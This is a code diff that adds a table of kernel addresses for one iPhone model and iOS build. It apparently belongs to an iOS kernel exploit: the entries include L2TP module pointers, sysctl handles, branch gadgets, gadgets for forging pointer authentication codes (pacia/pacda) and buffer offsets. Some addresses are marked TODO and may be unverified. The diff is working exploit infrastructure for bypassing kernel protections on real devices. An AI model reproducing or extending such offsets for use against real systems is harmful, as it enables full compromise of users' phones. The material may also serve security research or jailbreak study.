@@ -138,6 +138,33 @@ addresses__iphone11_6__16B92(){
 }
 
 static void
+addresses__iphone11_2__16A366(){
+  // @umanghere
+  ADDRESS(paciza_pointer__l2tp_domain_module_start)       = SLIDE(0xfffffff008ff8d38); // TODO
+  ADDRESS(paciza_pointer__l2tp_domain_module_stop)        = SLIDE(0xfffffff008ff8d40); // TODO
+
+  ADDRESS(l2tp_domain_inited)                             = SLIDE(0xFFFFFFF0091607E8);
+
+  ADDRESS(sysctl__net_ppp_l2tp)                           = SLIDE(0xFFFFFFF0091607C8);
+  ADDRESS(sysctl_unregister_oid)                          = SLIDE(0xFFFFFFF007BA8744);
+
+  ADDRESS(mov_x0_x4__br_x5)                               = SLIDE(0xfffffff00886c1b8);
+  ADDRESS(mov_x9_x0__br_x1)                               = SLIDE(0xfffffff00889d60c);
+  ADDRESS(mov_x10_x3__br_x6)                              = SLIDE(0xfffffff00885c7bc);
+
+  ADDRESS(kernel_forge_pacia_gadget)                      = SLIDE(0xfffffff007bb2c3c);
+  ADDRESS(kernel_forge_pacda_gadget)                      = SLIDE(0xfffffff007bb2c6c);
+  ADDRESS(IOUserClient__vtable)                           = SLIDE(0xfffffff00914ce10);
+
+  ADDRESS(IORegistryEntry__getRegistryEntryID)            = SLIDE(0xfffffff008068334); // TODO
+
+  SIZE(kernel_forge_pacxa_gadget_buffer)                  = 0x110;
+  OFFSET(kernel_forge_pacxa_gadget_buffer, first_access)  = 0xe8;
+  OFFSET(kernel_forge_pacxa_gadget_buffer, pacia_result)  = 0xf0;
+  OFFSET(kernel_forge_pacxa_gadget_buffer, pacda_result)  = 0xe8;
+}
+
+static void
 addresses__iphone10_1__16C101() {
 	ADDRESS(IOUserClient__vtable)                           = SLIDE(0xfffffff0070cc648);
 	ADDRESS(IORegistryEntry__getRegistryEntryID)            = SLIDE(0xfffffff00759424c);
